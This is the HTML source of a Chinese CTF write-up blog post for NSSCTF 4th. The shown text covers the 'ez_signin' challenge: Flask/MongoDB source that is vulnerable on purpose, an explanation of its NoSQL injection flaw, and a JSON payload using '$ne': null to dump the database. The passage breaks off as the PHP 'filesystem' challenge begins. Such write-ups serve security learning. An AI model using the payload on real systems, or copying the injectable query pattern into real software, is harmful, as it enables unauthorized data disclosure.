@@ -1,0 +1,2066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2025/08/26/nssctf 4th/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="第一次打比赛AK了，虽然题比较简单没啥好说的，但还是想记录一下  WEBez_signin源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from flask">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF 4th WP">
+<meta property="og:url" content="http://laijunyue.github.io/2025/08/26/NSSCTF%204th/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="第一次打比赛AK了，虽然题比较简单没啥好说的，但还是想记录一下  WEBez_signin源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from flask">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824155837956.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824111139465.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824121910353.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824122812174.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824123730964.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824132731057.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824155641475.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250824155709672.png">
+<meta property="article:published_time" content="2025-08-26T14:14:11.000Z">
+<meta property="article:modified_time" content="2025-08-25T05:59:09.494Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laijunyue.github.io/images/image-20250824155837956.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            NSSCTF 4th WP -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">NSSCTF 4th WP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/xiaolai.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-26 22:14:11</span>
+        <span class="mobile">2025-08-26 22:14:11</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-25 13:59:09</span>
+            <span class="mobile">2025-08-25 13:59:09</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>第一次打比赛AK了，虽然题比较简单没啥好说的，但还是想记录一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824155837956.png"
+                      alt="image-20250824155837956"
+                ></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h2><p>源码：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = MongoClient(<span class="string">&quot;mongodb://localhost:27017/&quot;</span>)</span><br><span class="line">db = client[<span class="string">&#x27;aggie_bookstore&#x27;</span>]</span><br><span class="line">books_collection = db[<span class="string">&#x27;books&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">input_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^a-zA-Z0-9\s]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, input_str)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    query = &#123;<span class="string">&quot;$and&quot;</span>: []&#125;</span><br><span class="line">    books = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        title = request.args.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        author = request.args.get(<span class="string">&#x27;author&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        title_clean = sanitize(title)</span><br><span class="line">        author_clean = sanitize(author)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> title_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: title_clean&#125;&#125;)  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> author_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: author_clean&#125;&#125;) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">            books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.content_type == <span class="string">&#x27;application/json&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = request.get_json(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                title = data.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">                author = data.get(<span class="string">&quot;author&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(title, <span class="built_in">str</span>):</span><br><span class="line">                    title = sanitize(title)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(title, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(author, <span class="built_in">str</span>):</span><br><span class="line">                    author = sanitize(author)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(author, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">                    books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line">                    <span class="keyword">return</span> jsonify([</span><br><span class="line">                        &#123;<span class="string">&quot;title&quot;</span>: b.get(<span class="string">&quot;title&quot;</span>), <span class="string">&quot;author&quot;</span>: b.get(<span class="string">&quot;author&quot;</span>), <span class="string">&quot;description&quot;</span>: b.get(<span class="string">&quot;description&quot;</span>)&#125; <span class="keyword">for</span> b <span class="keyword">in</span> books</span><br><span class="line">                    ])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Empty query&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported Content-Type&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>NoSQL 注入漏洞<strong>漏洞描述</strong>： 代码允许客户端直接传入字典对象作为查询条件 (<code>if isinstance(author, dict)</code>)，并且未经任何处理就直接拼接到查询 <code>query[“$and”].append(&#123;“author”: author&#125;)</code>中</p>
+<p><strong>攻击方式</strong>： 攻击者可以构造一个恶意的 JSON 请求体，例如：</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ne&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ne&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这会导致 MongoDB 执行的查询变为 <code>&#123;&quot;$and&quot;: [&#123;&quot;title&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;, &#123;&quot;author&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;]&#125;</code>，意思是“找出所有标题和作者字段不为空的文档”，即<strong>泄露数据库中的所有信息</strong>。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824111139465.png"
+                      alt="image-20250824111139465"
+                ></p>
+<h2 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h2><p>源码</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span 